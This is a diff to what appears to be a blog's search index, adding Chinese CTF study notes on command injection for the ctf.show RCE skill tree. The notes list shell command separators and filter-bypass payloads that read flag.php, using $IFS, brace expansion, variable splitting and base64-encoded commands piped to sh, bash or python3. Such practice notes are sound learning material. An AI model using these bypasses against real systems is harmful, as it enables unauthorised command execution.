@@ -3,15 +3,52 @@
   <entry>
     <title>CTF_Show_RCE技能树</title>
     <url>/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html</url>
-    <content><![CDATA[<h2 id="RCE-总结"><a href="#RCE-总结" class="headerlink" title="RCE 总结"></a>RCE 总结</h2><p><strong><font style="color:#DF2A3F;">命令分割符号：</font></strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">linux:</span><br><span class="line">-%0a(回车) %0d(换行)   </span><br><span class="line">-;    </span><br><span class="line">-&amp;      </span><br><span class="line">-|       </span><br><span class="line">-&amp;&amp;    </span><br><span class="line">-||</span><br><span class="line">Windows:</span><br><span class="line">-%0a</span><br><span class="line">-&amp;</span><br><span class="line">-|</span><br><span class="line">-%1a（作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<h2 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a>RCE总结</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="命令分割符号："><a href="#命令分割符号：" class="headerlink" title="命令分割符号："></a><font style="color:#DF2A3F;">命令分割符号：</font></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">linux:</span><br><span class="line">-%0a(回车) %0d(换行)   </span><br><span class="line">-;    </span><br><span class="line">-&amp;      </span><br><span class="line">-|       </span><br><span class="line">-&amp;&amp;    </span><br><span class="line">-||</span><br><span class="line">Windows:</span><br><span class="line">-%0a</span><br><span class="line">-&amp;</span><br><span class="line">-|</span><br><span class="line">-%1a（作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
 
 
 
-
-
-
-
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul>
+<li>**<font style="color:#DF2A3F;">cat</font>**：用<code>ca\t</code>or 定义表达式</li>
+<li>**<font style="color:#DF2A3F;">空格</font>**：用<code>$IFS$1</code>、大括号扩展<code>&#123;cat,flag.php&#125;</code>、<code>cat&lt;flag.php</code>、<code>cat&lt;&gt;</code><ul>
+<li>1<code>&#123;cat,flag.php&#125;</code>大括号扩展：生成一个逗号分割的字符串集合</li>
+<li>会分别执行 cat flag.php</li>
+<li>2<code>cat$&#123;IFS&#125;flag.php</code>内部字段分隔符 IFS：相当于空格、制表、换行</li>
+<li>3<code>cat$IFS$9flag.php</code>$9 是第 9 个参数<ul>
+<li>可以理解为无意义字符，为了绕过检测用的（其实指向第九个参数，这里根本没有指定参数）</li>
+</ul>
+</li>
+<li>4<code>cat&lt;flag.php</code>flag.php 重定向为 cat 的输入</li>
+<li>5<code>cat&lt;&gt;flag.php</code>读取并写入 flag.php<ul>
+<li>其实等于 4，读取再写入</li>
+</ul>
+</li>
+<li>6<code>kg=$&#39;\x20flag.php&#39;&amp;&amp;cat$kg</code>定义<code>kg=$&#39;\x20flag.php&#39;</code>其中 \x20 是 ASCII 中的空格<ul>
+<li>直接定义访问了</li>
+</ul>
+</li>
+<li>7<code>a=c;b=at;c=flag.php;$a$b $c</code>定义表达式访问<ul>
+<li><code>a=ca;b=$&#39;t\x20&#39;;c=flag.php;$a$b$c</code>也可以</li>
+</ul>
+</li>
+<li>8<code>b=ag;a=fl;cat$IFS$1$a$b.php</code>定义表达式+内部字段分割符</li>
+<li>9<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><ul>
+<li>用 echo 输出 base64 编码的<code>cat flag</code>管道到 base64 解密，然后管道到 sh 中执行</li>
+</ul>
+</li>
+<li>10<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</code>只是把执行换位了 bash</li>
+<li>11<code>echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</code>用的 python 来执行<ul>
+<li><code>import os</code></li>
+<li><code>print(os.system(&#39;cat flag.php&#39;))</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>**<font style="color:#DF2A3F;">最好用的是定义表达式</font>**：<ul>
+<li>比如正常的<code>cat flag.php</code></li>
+<li><code>;a=fl;b=ag.php;cat$IFS$1$a$b</code></li>
+</ul>
+</li>
+</ul>
 <h2 id="RCE-文件包含"><a href="#RCE-文件包含" class="headerlink" title="RCE_ 文件包含"></a>RCE_ 文件包含</h2><p><a href="https://www.ctfhub.com/#/skilltree">技能树连接</a></p>
 <p>ctf_show 的 RCE 的技能树</p>
 <p><img src="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png"></p>
